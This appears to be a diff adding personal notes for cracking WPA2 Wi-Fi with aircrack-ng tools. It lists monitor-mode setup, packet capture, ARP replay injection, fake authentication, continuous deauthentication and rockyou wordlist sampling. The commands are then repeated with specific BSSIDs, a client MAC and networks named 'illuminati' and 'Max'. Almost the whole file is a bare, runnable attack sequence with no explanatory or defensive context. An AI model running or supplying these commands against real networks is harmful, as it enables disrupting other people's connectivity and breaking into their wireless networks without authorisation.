@@ -1,0 +1,73 @@
+
+
+
+airmon-ng start wlan0
+
+
+
+get BSSID
+airodump-ng wlan0mon
+
+
+start capturing packets
+airodump-ng wlan0mon --bssid <bssid> --channel <#> --write crackThis    // -j flag for hashcat output
+
+
+
+Inject:
+
+get mac MAC
+aireplay-ng --arpreplay wlan0mon -e <ESSID> -h <BSSID>
+
+
+fake authentication
+aireplay-ng --fakeauth 0 -a <BSSID> wlan0mon -h <mac>
+
+
+deauthorize
+aireplay-ng --deauth 0 -e <ESSID> wlan0mon
+
+
+look at aireplay results
+aireplay-ng --arpreplay wlan0mon -e <ESSID> -h <BSSID>
+
+
+
+
+
+head /usr/share/wordlists/rockyou.txt -n 10000 | shuf -n 5 -
+
+
+
+ 92:3B:AD:0B:75:26  -56       13        0    0   4  360   WPA2 CCMP   PSK  illuminati 
+
+
+airodump-ng wlan0mon --bssid 92:3B:AD:0B:75:26 --channel 4 --write crackThis
+
+
+aireplay-ng --arpreplay wlan0mon -e illuminati -h 92:3B:AD:0B:75:26
+
+C0:1C:30:06:CE:72
+
+aireplay-ng --fakeauth 0 -a 92:3B:AD:0B:75:26 wlan0mon -h C0:1C:30:06:CE:72
+
+aireplay-ng --deauth 0 -e illuminati wlan0mon
+
+
+
+
+
+
+
+
+
+airodump-ng wlan0mon --bssid C2:C8:77:E0:85:20 --channel 1 --write crackThisOne
+
+aireplay-ng --arpreplay wlan0mon -e Max -h C2:C8:77:E0:85:20
+
+aireplay-ng --fakeauth 0 -a C2:C8:77:E0:85:20 wlan0mon -h C0:1C:30:06:CE:72
+
+Max
+C2:C8:77:E0:85:20  -31        2        0    0   1  130   WPA2 CCMP   PSK  Max 
+mac
+C0:1C:30:06:CE:72
